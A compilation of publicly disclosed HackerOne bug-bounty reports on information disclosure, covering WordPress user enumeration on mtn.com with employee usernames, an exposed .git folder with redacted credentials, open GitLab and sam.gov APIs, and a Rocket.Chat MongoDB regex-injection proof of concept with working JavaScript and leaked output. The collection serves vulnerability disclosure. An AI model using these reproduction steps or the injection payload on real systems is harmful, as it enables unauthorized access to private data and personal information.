##url: https://www.mtn.com/wp-json/wp/v2/users/

Sorry to say this still i can reproduce this issue please remove  [ /wp-json/wp/v2/users/ ] file if your domain dont use that file
i will send the proof below still this issue is present on the domain 

##Summary:

Using REST API, we can see all the WordPress users/author with some of their information. Which can even be Personal information of employees/author. The file v2/users at:  https://www.mtn.com/wp-json/wp/v2/users/   is enabled and this give the attacker many users names like:  Amogelang Maluleka Greg Davies karenbyamugisha Marc Ilunga mitchprinsloo

## Steps To Reproduce:

  1. Go to https://www.mtn.com/wp-json/wp/v2/users/ [ Allows anyone to view active usernames ]
   
{F2050760}

## Supporting Material/References:

https://hackerone.com/reports/356047
https://hackerone.com/reports/370777

##Fix:

Use this code will hide the users list and give 404 as the result, while rest of the api calls keep running as they were.
 ```
add_filter( 'rest_endpoints', function( $endpoints ){
    if ( isset( $endpoints['/wp/v2/users'] ) ) {
        unset( $endpoints['/wp/v2/users'] );
    }
    if ( isset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] ) ) {
        unset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] );
    }
    return $endpoints;
});
 ```

## Impact

Malicious counterpart could collect the usernames disclosed (and the admin user) and be focused throughout BF attack (as the usernames are now known), making it less harder to penetrate the data.gov systems.

---

### [Any organization's assets pending review can be downloaded](https://hackerone.com/reports/1787644)

- **Report ID:** `1787644`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2022-11-29T18:36:13.305Z
- **CVE(s):** -

**Vulnerability Information:**

# Steps to reproduce
- sign in as any user
- visit https://hackerone.com/organizations/:handle/assets/download_pending_reviews.csv, where `:handle` is the organization you want to download the assets for

## Impact

This may leak sensitive data about an organization's attack surface.

---

### [Wordpress users Disclosure [ /wp-json/wp/v2/users/ ]](https://hackerone.com/reports/1735586)

- **Report ID:** `1735586`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** MTN Group
- **Reporter:** @shubham_srt
- **Bounty:** - usd
- **Disclosed:** 2022-11-27T03:25:02.082Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Using REST API, we can see all the WordPress users/author with some of their information. Which can even be Personal information of employees/author. The file v2/users at:  https://www.mtn.com/wp-json/wp/v2/users/   is enabled and this give the attacker many users names like:  `Amogelang Maluleka` `Greg Davies` `karenbyamugisha` `Marc Ilunga` `mitchprinsloo`

## Steps To Reproduce:

  1.  Go to https://www.mtn.com/wp-json/wp/v2/users/  [ Allows anyone to view active usernames ]

{F1985941}

## Supporting Material/References:
https://hackerone.com/reports/356047
https://hackerone.com/reports/370777

###Fix:
Use this code will hide the users list and give 404 as the result, while rest of the api calls keep running as they were.
```javascript
add_filter( 'rest_endpoints', function( $endpoints ){
    if ( isset( $endpoints['/wp/v2/users'] ) ) {
        unset( $endpoints['/wp/v2/users'] );
    }
    if ( isset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] ) ) {
        unset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] );
    }
    return $endpoints;
});
```

## Impact

Malicious counterpart could collect the usernames disclosed (and the admin user) and be focused throughout BF attack (as the usernames are now known), making it less harder to penetrate the data.gov systems.

---

### [User information disclosed via API](https://hackerone.com/reports/1218461)

- **Report ID:** `1218461`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. General Services Administration
- **Reporter:** @toormund
- **Bounty:** - usd
- **Disclosed:** 2022-10-19T18:47:49.386Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

It appears that the requests for "system accounts" are fully available via an API endpoint that does not require authentication. 

The main issue is that among the information disclosed are user emails (many with gmail addresses) but the individual applications also include information that the user provides about their organization/integration such as IP addresses, physical locations and whether or not the system uses okta. 

## Steps To Reproduce:

Navigate to the following URL:  https://sam.gov/api/prod/iam/cws/v1/applications/

## Supporting Material/References:

Help desk article about what the [system accounts are](http://www.fsd.gov/gsafsd_sp?id=gsafsd_kb_articles&sys_id=c8d50f1d1b187c909ac5ddb6bc4bcbe2)

Here is an example object of what is returned from the endpoint:

```
{"uid":12345,"systemAccountName":"POC","interfacingSystemVersion":"beta.POCcom","systemDescriptionAndFunction":"example of data thgat is leaked","systemAdmins":"[]","systemManagers":"[{\"commonName\":\"James Bond\",\"uid\":\"fakepassword@gmail.com\",\"mail\":\"fake-fun@opayq.com\",\"name\":\"James Bond\",\"isGov\":false,\"id\":\"fake-fun@opayq.com\"}]","contractOpportunities":"","contractData":"","entityInformation":"","federalHierarchy":"","wageDeterminations":"","assistanceListings":"","referenceData":"","ipAddress":"","typeOfConnection":"","physicalLocation":"","securityOfficialName":"","securityOfficialEmail":"","uploadAto":"","authorizationConfirmation":false,"authorizingOfficialName":"","submittedDate":"2021-06-06T06:49:17.130+0000","submittedBy":"fake-fun@opayq.com","securityApprover":"","rejectedBy":"","rejectionReason":"","applicationStatus":"Draft","isGov":false,"migratedToOkta":false,"fips199Categorization":""}
```

## Impact

A threat actor could view personal information about users on the platform.

It is also theoretically possible that a threat actor could use information gathered from this endpoint to identify future targets and footholds.

---

### [.git folder exposed [HtUS]](https://hackerone.com/reports/1624157)

- **Report ID:** `1624157`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sudi
- **Bounty:** - usd
- **Disclosed:** 2022-10-14T17:44:25.663Z
- **CVE(s):** -

**Vulnerability Information:**

Heyy there,
I have found a exposed .git folder on https://█████



https://████████/.git/config


```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://████
	fetch = +refs/heads/*:refs/remotes/origin/*

```


Using gitdumper (https://github.com/internetwache/GitTools) , I was able to dump the whole `.git` directory and later was able to get access to the whole source code of the ███ application.

```bash
code
├── 404.php
├── build
│ └── app.min.js.map
├── css
│ └── style.css
├── debug
│ ├── debug.css
│ ├── debug.js
│ └── debug.svg
├── dispatch.php
├── files
│ └── images
├── index.php
├── install.php
├── js
│ ├── config.development.js
│ └── config.production.js
├── manual
│ ├── css
│ │ └── manual.css
│ └── index.php
├── private
│ ├── Gruntfile.js
│ ├── bootstrap.php
│ ├── build.js
│ ├── classes
│ │ ├── Config.php
│ │ ├── Controller.php
│ │ ├── Database.php
│ │ ├── DatabaseResult.php
│ │ ├── DatabaseResultRow.php
│ │ ├── DebugLog.php
│ │ ├── Dictionary.php
│ │ ├── FileUploader.php
│ │ ├── ImageUploader.php
│ │ ├── Importer.php
│ │ ├── Installer.php
│ │ ├── ModelController.php
│ │ ├── Modeler.php
│ │ ├── ███████
│ │ │ ├── Controller.php
│ │ │ ├── ProblemFetcher.php
│ │ │ └── Status.php
│ │ ├── ███████Browser.php
│ │ ├── Perls
│ │ │ ├── Controller.php
│ │ │ └── UserManager.php
│ │ ├── Request.php
│ │ ├── Router.php
│ │ ├── UploadController.php
│ │ ├── UserLogin.php
│ │ ├── XmlImporter.php
│ │ └── xAPI
│ │     ├── Builder.php
│ │     ├── Controller.php
│ │     └── Logger.php
│ ├── config.json
│ ├── controllers
│ │ ├── Author
│ │ │ ├── Applications.php
│ │ │ ├── Categories.php
│ │ │ ├── DefaultParameters.php
│ │ │ ├── Globals.php
│ │ │ ├── Images.php
│ │ │ ├── Lists.php
│ │ │ ├── Modules.php
│ │ │ ├── ProblemLayouts.php
│ │ │ ├── ProblemTemplates.php
│ │ │ ├── Problems.php
│ │ │ ├── Publish.php
│ │ │ ├── Tags.php
│ │ │ ├── Unpublish.php
│ │ │ ├── UploadImage.php
│ │ │ └── Users.php
│ │ ├── Import
│ │ │ ├── Parse.php
│ │ │ └── Submit.php
│ │ ├── ███
│ │ │ ├── Browse.php
│ │ │ ├── Load.php
│ │ │ ├── Problem.php
│ │ │ ├── Reset.php
│ │ │ └── Sequence.php
│ │ ├── Perls
│ │ │ ├── ListModules.php
│ │ │ ├── ProbeProblems.php
│ │ │ ├── Request██████.php
│ │ │ ├── SampleProblems.php
│ │ │ └── UserStatus.php
│ │ ├── User
│ │ │ ├── ConfirmEmail.php
│ │ │ ├── Consent.php
│ │ │ ├── Login.php
│ │ │ ├── Logout.php
│ │ │ ├── Register.php
│ │ │ ├── ResetPassword.php
│ │ │ ├── Save.php
│ │ │ ├── Touch.php
│ │ │ ├── Unique.php
│ │ │ └── VerifyEmail.php
│ │ └── xAPI
│ │     ├── Categories.php
│ │     ├── Modules.php
│ │     ├── Problems.php
│ │     ├── Statements.php
│ │     └── Users.php
│ ├── install.xml
│ ├── models
│ │ ├── Applications.php
│ │ ├── Categories.php
│ │ ├── FileTags.php
│ │ ├── GlobalParameters.php
│ │ ├── ImageTypes.php
│ │ ├── Images.php
│ │ ├── Lists.php
│ │ ├── Modules.php
│ │ ├── ProblemLayouts.php
│ │ ├── ProblemTemplates.php
│ │ ├── Problems.php
│ │ └── Users.php
│ ├── package.json
│ ├── sql
│ │ ├── application_parameters.sql
│ │ ├── applications.sql
│ │ ├── categories.sql
│ │ ├── category_parameters.sql
│ │ ├── category_prerequisites.sql
│ │ ├── completed_modules.sql
│ │ ├── file_tags.sql
│ │ ├── global_parameters.sql
│ │ ├── image_tag_map.sql
│ │ ├── image_types.sql
│ │ ├── images.sql
│ │ ├── lists.sql
│ │ ├── module_parameters.sql
│ │ ├── modules.sql
│ │ ├── performances.sql
│ │ ├── priorities.sql
│ │ ├── problem_graph.sql
│ │ ├── problem_layouts.sql
│ │ ├── problem_parameters.sql
│ │ ├── problem_templates.sql
│ │ ├── problems.sql
│ │ ├── problems_logged.sql
│ │ ├── retired_categories.sql
│ │ ├── user_authentication.sql
│ │ ├── user_status.sql
│ │ ├── users.sql
│ │ └── xapi_statements.sql
│ └── vendor
│     └── TinCanPHP
│         ├── About.php
│         ├── Activity.php
│         ├── ActivityDefinition.php
│         ├── ActivityProfile.php
│         ├── Agent.php
│         ├── AgentAccount.php
│         ├── AgentProfile.php
│         ├── Attachment.php
│         ├── Context.php
│         ├── ContextActivities.php
│         ├── Document.php
│         ├── Extensions.php
│         ├── Group.php
│         ├── LRSInterface.php
│         ├── LRSResponse.php
│         ├── LanguageMap.php
│         ├── Map.php
│         ├── Object.php
│         ├── RemoteLRS.php
│         ├── Result.php
│         ├── Score.php
│         ├── State.php
│         ├── Statement.php
│         ├── StatementBase.php
│         ├── StatementRef.php
│         ├── StatementTargetInterface.php
│         ├── StatementsResult.php
│         ├── SubStatement.php
│         ├── Util.php
│         ├── Verb.php
│         ├── Version.php
│         └── VersionableInterface.php
├── source
│ ├── application
│ │ ├── app.js
│ │ ├── attributes
│ │ │ ├── image.js
│ │ │ ├── template.js
│ │ │ └── text.js
│ │ ├── author
│ │ │ ├── images
│ │ │ │ ├── browse.js
│ │ │ │ ├── image.js
│ │ │ │ └── multiselected.js
│ │ │ ├── images.js
│ │ │ ├── lists
│ │ │ │ ├── browse.js
│ │ │ │ ├── list.js
│ │ │ │ └── multiselected.js
│ │ │ ├── lists.js
│ │ │ ├── parameters
│ │ │ │ ├── application.js
│ │ │ │ ├── category.js
│ │ │ │ ├── global.js
│ │ │ │ ├── module.js
│ │ │ │ └── problem.js
│ │ │ ├── sets
│ │ │ │ ├── images.js
│ │ │ │ └── tags.js
│ │ │ ├── structure
│ │ │ │ ├── browse.js
│ │ │ │ ├── category
│ │ │ │ │ ├── details.js
│ │ │ │ │ ├── parameters.js
│ │ │ │ │ └── prereqs.js
│ │ │ │ ├── category.js
│ │ │ │ ├── module
│ │ │ │ │ ├── details.js
│ │ │ │ │ ├── parameters.js
│ │ │ │ │ └── perls.js
│ │ │ │ ├── module.js
│ │ │ │ ├── problem
│ │ │ │ │ ├── details.js
│ │ │ │ │ └── parameters.js
│ │ │ │ ├── problem.js
│ │ │ │ └── tree.js
│ │ │ ├── structure.js
│ │ │ ├── tabs.js
│ │ │ ├── tags
│ │ │ │ ├── browse.js
│ │ │ │ ├── multiselected.js
│ │ │ │ └── tag.js
│ │ │ ├── tags.js
│ │ │ ├── templates
│ │ │ │ ├── browse.js
│ │ │ │ ├── multiselected.js
│ │ │ │ ├── template
│ │ │ │ │ ├── details.js
│ │ │ │ │ └── parameters.js
│ │ │ │ └── template.js
│ │ │ └── templates.js
│ │ ├── author.js
│ │ ├── dashboard.js
│ │ ├── dropdowns
│ │ │ ├── layouts.js
│ │ │ └── templates.js
│ │ ├── embed.js
│ │ ├── eula.js
│ │ ├── footer.js
│ │ ├── functions
│ │ │ └── ajax.js
│ │ ├── menus
│ │ │ ├── app.js
│ │ │ ├── checkbox.js
│ │ │ ├── help.js
│ │ │ └── user.js
│ │ ├── modals
│ │ │ ├── delete-application.js
│ │ │ ├── delete-category.js
│ │ │ ├── delete-image.js
│ │ │ ├── delete-list.js
│ │ │ ├── delete-module.js
│ │ │ ├── delete-problem.js
│ │ │ ├── delete-tag.js
│ │ │ ├── delete-template.js
│ │ │ ├── delete-user.js
│ │ │ ├── duplicate-category.js
│ │ │ ├── duplicate-list.js
│ │ │ ├── duplicate-module.js
│ │ │ ├── duplicate-problem.js
│ │ │ ├── duplicate-tag.js
│ │ │ ├── duplicate-template.js
│ │ │ ├── edit-application.js
│ │ │ ├── edit-category.js
│ │ │ ├── edit-image.js
│ │ │ ├── edit-list.js
│ │ │ ├── edit-module.js
│ │ │ ├── edit-problem.js
│ │ │ ├── edit-profile.js
│ │ │ ├── edit-tag.js
│ │ │ ├── edit-template.js
│ │ │ ├── edit-user.js
│ │ │ ├── import-problems.js
│ │ │ ├── manage-image-tags.js
│ │ │ ├── manage-images.js
│ │ │ ├── manage-prereqs.js
│ │ │ ├── modify-application-params.js
│ │ │ ├── modify-category-params.js
│ │ │ ├── modify-global-params.js
│ │ │ ├── modify-module-params.js
│ │ │ ├── modify-perls.js
│ │ │ ├── modify-problem-params.js
│ │ │ ├── modify-template-params.js
│ │ │ ├── move-category.js
│ │ │ ├── move-problem.js
│ │ │ ├── new-application.js
│ │ │ ├── new-category.js
│ │ │ ├── new-list.js
│ │ │ ├── new-module.js
│ │ │ ├── new-problem.js
│ │ │ ├── new-tag.js
│ │ │ ├── new-template.js
│ │ │ ├── new-user.js
│ │ │ ├── publish-application.js
│ │ │ ├── reset-module.js
│ │ │ ├── select-image.js
│ │ │ ├── select-list.js
│ │ │ ├── select-tag.js
│ │ │ ├── unpublish-application.js
│ │ │ ├── upload-images.js
│ │ │ └── wizard
│ │ │     ├── what-are-distractors.js
│ │ │     ├── what-is-a-learning-point.js
│ │ │     ├── what-is-a-module.js
│ │ │     ├── what-is-a-problem.js
│ │ │     ├── what-is-a-prompt.js
│ │ │     ├── what-is-a-token.js
│ │ │     ├── what-is-an-app.js
│ │ │     ├── what-is-feedback.js
│ │ │     └── what-is-the-difference.js
│ │ ├── module.js
│ │ ├── not-found.js
│ │ ├── ███
│ │ │ ├── finale.js
│ │ │ ├── intro.js
│ │ │ ├── mastery.js
│ │ │ ├── passive.js
│ │ │ └── trial.js
│ │ ├── ████.js
│ │ ├── preview.js
│ │ ├── redux
│ │ │ ├── actions.js
│ │ │ ├── adapters.js
│ │ │ ├── reducers.js
│ │ │ └── store.js
│ │ ├── user
│ │ │ ├── authenticated.js
│ │ │ ├── authorized.js
│ │ │ ├── consent.js
│ │ │ ├── login.js
│ │ │ ├── register.js
│ │ │ └── verify.js
│ │ ├── user-management.js
│ │ ├── wizard
│ │ │ ├── apps
│ │ │ │ ├── create.js
│ │ │ │ ├── index.js
│ │ │ │ └── select.js
│ │ │ ├── attributes
│ │ │ │ ├── answer
│ │ │ │ │ ├── image
│ │ │ │ │ │ ├── choose.js
│ │ │ │ │ │ ├── preview.js
│ │ │ │ │ │ ├── specify.js
│ │ │ │ │ │ ├── tag
│ │ │ │ │ │ │ ├── create
│ │ │ │ │ │ │ │ ├── images.js
│ │ │ │ │ │ │ │ └── name.js
│ │ │ │ │ │ │ ├── create.js
│ │ │ │ │ │ │ └── select.js
│ │ │ │ │ │ └── tag.js
│ │ │ │ │ ├── image.js
│ │ │ │ │ └── text.js
│ │ │ │ ├── answer.js
│ │ │ │ ├── continue.js
│ │ │ │ ├── distractors
│ │ │ │ │ ├── index
│ │ │ │ │ │ ├── edit.js
│ │ │ │ │ │ └── preview.js
│ │ │ │ │ ├── index.js
│ │ │ │ │ ├── lists
│ │ │ │ │ │ ├── create.js
│ │ │ │ │ │ ├── index.js
│ │ │ │ │ │ └── select.js
│ │ │ │ │ ├── specify
│ │ │ │ │ │ ├── image
│ │ │ │ │ │ │ ├── edit.js
│ │ │ │ │ │ │ └── preview.js
│ │ │ │ │ │ ├── image.js
│ │ │ │ │ │ └── text.js
│ │ │ │ │ ├── specify.js
│ │ │ │ │ ├── summary.js
│ │ │ │ │ └── tags
│ │ │ │ │     ├── create
│ │ │ │ │     │ ├── images.js
│ │ │ │ │     │ └── name.js
│ │ │ │ │     ├── create.js
│ │ │ │ │     ├── index.js
│ │ │ │ │     └── select.js
│ │ │ │ ├── edit.js
│ │ │ │ ├── feedback.js
│ │ │ │ ├── image
│ │ │ │ │ ├── choose.js
│ │ │ │ │ ├── preview.js
│ │ │ │ │ ├── specify.js
│ │ │ │ │ ├── tag
│ │ │ │ │ │ ├── create
│ │ │ │ │ │ │ ├── images.js
│ │ │ │ │ │ │ └── name.js
│ │ │ │ │ │ ├── create.js
│ │ │ │ │ │ └── select.js
│ │ │ │ │ └── tag.js
│ │ │ │ ├── image.js
│ │ │ │ ├── layout.js
│ │ │ │ ├── preview.js
│ │ │ │ └── question.js
│ │ │ ├── breadcrumbs.js
│ │ │ ├── categories
│ │ │ │ ├── create.js
│ │ │ │ ├── index.js
│ │ │ │ └── select.js
│ │ │ ├── modules
│ │ │ │ ├── create.js
│ │ │ │ ├── index.js
│ │ │ │ └── select.js
│ │ │ ├── problems
│ │ │ │ ├── create
│ │ │ │ │ ├── layout.js
│ │ │ │ │ └── name.js
│ │ │ │ ├── create.js
│ │ │ │ ├── index.js
│ │ │ │ └── select.js
│ │ │ └── samples.js
│ │ └── wizard.js
│ ├── application.js
│ ├── classes
│ │ ├── actions.js
│ │ ├── persistent.js
│ │ └── timer.js
│ ├── constants.js
│ ├── functions
│ │ ├── adapters.js
│ │ ├── ajax.js
│ │ ├── collection.js
│ │ ├── cookies.js
│ │ ├── enumerable.js
│ │ ├── preload.js
│ │ └── reducers.js
│ ├── main.js
│ ├── mixins
│ │  └── validatable.js
│ ├── vendor
│ │ ├── history
│ │ │ ├── history.js
│ │ │ └── history.min.js
│ │ ├── react
│ │ │ ├── react-dom-server.js
│ │ │ ├── react-dom-server.min.js
│ │ │ ├── react-dom.js
│ │ │ ├── react-dom.min.js
│ │ │ ├── react-with-addons.js
│ │ │ ├── react-with-addons.min.js
│ │ │ ├── react.js
│ │ │ └── react.min.js
│ │ ├── react-redux
│ │ │ ├── react-redux.js
│ │ │ └── react-redux.min.js
│ │ ├── react-router
│ │ │ ├── ReactRouter.js
│ │ │ └── ReactRouter.min.js
│ │ └── redux
│ │     ├── redux.js
│ │     └── redux.min.js
│ └── widgets
│     ├── alerts.js
│     ├── attribute-image.js
│     ├── button.js
│     ├── checkbox.js
│     ├── clickable.js
│     ├── content.js
│     ├── equalize.js
│     ├── file-browser.js
│     ├── form.js
│     ├── modals.js
│     ├── popover.js
│     ├── searchbox.js
│     └── unreact.js
├── style.css
├── tasks
│ └── xapi.php
└── vendor
    ├── animate.css
    ├── babel-core
    │ └── 5.8.23
    │     ├── browser-polyfill.js
    │     ├── browser-polyfill.min.js
    │     ├── browser.js
    │     └── browser.min.js
    ├── classList.min.js
    ├── es6-module-loader
    │ ├── es6-module-loader-dev.js
    │ ├── es6-module-loader-dev.js.map
    │ ├── es6-module-loader-dev.src.js
    │ ├── es6-module-loader.js
    │ ├── es6-module-loader.js.map
    │ └── es6-module-loader.src.js
    ├── fastclick.js
    ├── font-awesome
    │ ├── css
    │ │ ├── font-awesome.css
    │ │ └── font-awesome.min.css
    │ └── fonts
    │     ├── FontAwesome.otf
    │     ├── fontawesome-webfont.eot
    │     ├── fontawesome-webfont.svg
    │     ├── fontawesome-webfont.ttf
    │     ├── fontawesome-webfont.woff
    │     └── fontawesome-webfont.woff2
    ├── foundation
    │ ├── foundation
    │ │ ├── foundation.abide.js
    │ │ ├── foundation.accordion.js
    │ │ ├── foundation.alert.js
    │ │ ├── foundation.clearing.js
    │ │ ├── foundation.dropdown.js
    │ │ ├── foundation.equalizer.js
    │ │ ├── foundation.interchange.js
    │ │ ├── foundation.joyride.js
    │ │ ├── foundation.js
    │ │ ├── foundation.magellan.js
    │ │ ├── foundation.offcanvas.js
    │ │ ├── foundation.orbit.js
    │ │ ├── foundation.reveal.js
    │ │ ├── foundation.slider.js
    │ │ ├── foundation.tab.js
    │ │ ├── foundation.tooltip.js
    │ │ └── foundation.topbar.js
    │ ├── foundation.css
    │ ├── foundation.min.css
    │ ├── foundation.min.js
    │ └── foundation.modified.min.js
    ├── jquery
    │ └── jquery-2.1.3.min.js
    ├── modernizr.js
    └── systemjs
        ├── system-csp-production.js
        ├── system-csp-production.js.map
        ├── system-csp-production.src.js
        ├── system-polyfills.js
        ├── system-polyfills.js.map
        ├── system-polyfills.src.js
        ├── system-register-only.js
        ├── system-register-only.js.map
        ├── system-register-only.src.js
        ├── system.js
        ├── system.js.map
        └── system.src.js

370 directories, 3515 files
```

By just looking at some interesting files such as `config.js`, I found the credentials for the database:

`/private/config.json`

```json
{
	    // DATABASE_HOST
    // Database host to connect to
    
    "DATABASE_HOST":"localhost",
    
    // DATABASE_USER
    // Name of the database user to connect as
    
    "DATABASE_USER":"███",
    
    // DATABASE_PASSWORD
    // Password to connect with
    
    "DATABASE_PASSWORD":"█████████",
    
    // DATABASE_NAME
    // Name of the Authoring Tools database
    
    "DATABASE_NAME":"███████",
}
```

And another interesting file where I found user email addresses and password hashes: `/private/install.xml`

```xml
<user>
    <email>██████████</email>
    <password>█████</password>
    <name>██████</name>
    <superuser>1</superuser>
</user>
<user>
    <email>█████</email>
    <password>███████</password>
    <name>███████</name>
    <superuser>1</superuser>
</user>
<user>
    <email>████</email>
    <password>████</password>
    <name>█████</name>
    <superuser>1</superuser>
</user>
<user>
    <email>██████████</email>
    <password>███</password>
    <name>█████████</name>
    <superuser>1</superuser>
</user>
<user>
    <email>████████</email>
    <password>██████████</password>
    <name>█████████</name>
    <superuser>1</superuser>
</user>
<user>
    <email>██████</email>
    <password>████████</password>
    <name>████████</name>
    <superuser>1</superuser>
</user>
```


The information disclosed in above two files is really very sensitive, I haven't looked much into other files but I am pretty sure there will be much more things like this in the source code.

## Impact

An attacker by dumping the whole source code , can find credentials such as I have shown in my report (db creds, administrator creds) and also they will have full access to the source code of the application.

Thankyou
Regards
Sudhanshu

---

### [insecure gitlab repositories at ████████ [HtUS]](https://hackerone.com/reports/1624152)

- **Report ID:** `1624152`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @thpless
- **Bounty:** - usd
- **Disclosed:** 2022-09-27T18:18:55.472Z
- **CVE(s):** -

**Vulnerability Information:**

**If you click the link https://███, you're redirected to https://██████/users/sign_in, where credentials have to be inserted. 
The repositories are private and shouldn't be accessable for unauthenticated users!**

### POC

* If you click the following links https://████/api/v4/projects, information about internal projects and users is leaked

* I just take projectid: 4667 as an example for the information disclosure
```
{"id":4667,"description":"This Network-graph based literature review tool uses the open-source version of Neo4j (https://neo4j.com/) with Jupyter Notebooks written in Python to import academic literature metadata from a variety of sources. \r\n","name":"Graph-Based Literature Review Tool","name_with_namespace":"Senft, Michael / Graph-Based Literature Review Tool","path":"graph-based-literature-review-tool","path_with_namespace":"██████████/graph-based-literature-review-tool","created_at":"2021-10-19T12:47:16.550-07:00","default_branch":"master","tag_list":[],"topics":[],"ssh_url_to_repo":"git@██████:████/graph-based-literature-review-tool.git","http_url_to_repo":"https://████████/███████/graph-based-literature-review-tool.git","web_url":"https://████████/████████/graph-based-literature-review-tool","readme_url":"https://███/███/graph-based-literature-review-tool/-/blob/master/README.md","avatar_url":"https://████/uploads/-/system/project/avatar/4667/SchemaModel.jpg","forks_count":0,"star_count":1,"last_activity_at":"2022-01-31T08:48:54.473-08:00","namespace":{"id":1306,"name":"Senft, Michael","path":"██████████","kind":"user","full_path":"██████","parent_id":null,"avatar_url":"/uploads/-/system/user/avatar/1117/avatar.png","web_url":"https://███/████████"}}
```

* The source-code is accessable/readable: 
https://██████████/████/graph-based-literature-review-tool
https://█████/███████/graph-based-literature-review-tool/-/blob/master/README.md 

* It can be cloned 
```
git clone https://███/██████████/graph-based-literature-review-tool.git
Cloning into 'graph-based-literature-review-tool'...
remote: Enumerating objects: 198, done.
remote: Counting objects: 100% (68/68), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 198 (delta 41), reused 64 (delta 37), pack-reused 130
Receiving objects: 100% (198/198), 239.72 KiB | 503.00 KiB/s, done.
Resolving deltas: 100% (109/109), done.
```

## Impact

A potential attacker has full access to user information and to the users source-code

---

### [API route chat.getThreadsList leaks private message content](https://hackerone.com/reports/1446767)

- **Report ID:** `1446767`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2022-09-22T16:03:36.155Z
- **CVE(s):** CVE-2022-32229

**Summary (team):**

## Summary

The `/api/v1/chat.getThreadsList` does not sanitize user inputs and can therefore leak private thread messages to unauthorized users via Mongo DB injection.

## Description

The `chat.getThreadsList` API route is defined in [app/api/server/v1/chat.js#L522-L572](https://github.com/RocketChat/Rocket.Chat/blob/50d55d7a11c35893483b5561131486bd8b6bad7f/app/api/server/v1/chat.js#L522-L572):

```javascript
const { rid, type, text } = this.queryParams;
const { offset, count } = this.getPaginationItems();
const { sort, fields, query } = this.parseJsonQuery();

if (!rid) {
	throw new Meteor.Error('The required "rid" query param is missing.');
}
if (!settings.get('Threads_enabled')) {
	throw new Meteor.Error('error-not-allowed', 'Threads Disabled');
}
const user = Users.findOneById(this.userId, { fields: { _id: 1 } });
const room = Rooms.findOneById(rid, { fields: { t: 1, _id: 1 } });
if (!canAccessRoom(room, user)) {
	throw new Meteor.Error('error-not-allowed', 'Not Allowed');
}

const typeThread = {
	_hidden: { $ne: true },
	...(type === 'following' && { replies: { $in: [this.userId] } }),
	...(type === 'unread' && {
		_id: { $in: Subscriptions.findOneByRoomIdAndUserId(room._id, user._id).tunread },
	}),
	msg: new RegExp(escapeRegExp(text), 'i'),
};

const threadQuery = { ...query, ...typeThread, rid, tcount: { $exists: true } };
const cursor = Messages.find(threadQuery, {
	sort: sort || { tlm: -1 },
	skip: offset,
	limit: count,
	fields,
});

const total = cursor.count();

const threads = cursor.fetch();

return API.v1.success({
	threads,
	count: threads.length,
	offset,
	total,
});
```

Clients can provide JSON data in Query Parameters:

```javascript
const { rid, type, text } = this.queryParams;
```

The ACL check is performed against the first room returned by Mongo DB:

```javascript
const room = Rooms.findOneById(rid, { fields: { t: 1, _id: 1 } });
if (!canAccessRoom(room, user)) {
	throw new Meteor.Error('error-not-allowed', 'Not Allowed');
}
```

After the access permission check, the original `rid` parameter is again provided as Mongo DB query input, but unlike the ACL check can return multiple results:

```javascript
const threadQuery = { ...query, ...typeThread, rid, tcount: { $exists: true } };
const cursor = Messages.find(threadQuery, {
	sort: sort || { tlm: -1 },
	skip: offset,
	limit: count,
	fields,
});
```

An authenticated adversary can provide an input that matches to multiple rooms of which the first match can be read by the malicious user. MongoDB will return the results in storage order, so that the channel that passes the ACL check must have been created before the target. For demonstration purposes the `GENERAL` channel was used:

```javascript
const TARGET_ROOM = "<ROOM_ID>";

const fetchApi = async (url, options = {}) => {
	return fetch(`/api/v1/${url}`, {
		...options,
		headers: {
			'X-User-Id': Meteor._localStorage.getItem(Accounts.USER_ID_KEY),
			'X-Auth-Token': Meteor._localStorage.getItem(Accounts.LOGIN_TOKEN_KEY),
			'Content-Type': 'application/json',
			...(options.headers || {})
		}
	}).then((res) => res.json())
	.then((data) => { console.log(data); return data; });
};

fetchApi("chat.getThreadsList?rid[$regex]=GENERAL|${TARGET_ROOM}").then(console.log)
```

The object printed to the console has the secret message included in the `threads` property:

```json
{
    "threads": [
        {
            "_id": "7sJLzbjDL7iL56Lmc",
            "rid": "YkJAwxJHe5t7BWimY",
            "msg": "secret message",
            "ts": "2022-01-11T12:26:20.603Z",
            "u": {
                "_id": "kYfzDMQLyPFjS9ASb",
                "username": "gronke",
                "name": "gronke"
            },
            "urls": [],
            "mentions": [],
            "channels": [],
            "md": [
                {
                    "type": "PARAGRAPH",
                    "value": [
                        {
                            "type": "PLAIN_TEXT",
                            "value": "secret message"
                        }
                    ]
                }
            ],
            "_updatedAt": "2022-01-11T12:45:40.086Z",
            "replies": [
                "kYfzDMQLyPFjS9ASb"
            ],
            "tcount": 1,
            "tlm": "2022-01-11T12:45:39.971Z"
        }
    ],
    "count": 1,
    "offset": 0,
    "total": 1,
    "success": true
}
```

For comparison it is not allowed to read the message directly:

```javascript
>>> Meteor.call("getMessages", ["7sJLzbjDL7iL56Lmc"], console.log)
{
    "isClientSafe": true,
    "error": "error-not-allowed",
    "reason": "Not allowed",
    "details": {
        "method": "getSingleMessage"
    },
    "message": "Not allowed [error-not-allowed]",
    "errorType": "Meteor.Error"
}
```

## Releases Affected:

  * develop

The change was introduced in [#7632f12c](https://github.com/RocketChat/Rocket.Chat/commit/7632f12cfcc7ed8ee8f843587fdff63b101cc765) and did not land in a release yet. Previous versions appear to be affected in a similar way, but within the `query` parameter instead of `rid`.

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create a thread in a private room between users Alice and Bob
  2. Login as Trudy
  3. Leak Alice and Bobs private Room ID (not discussed here)
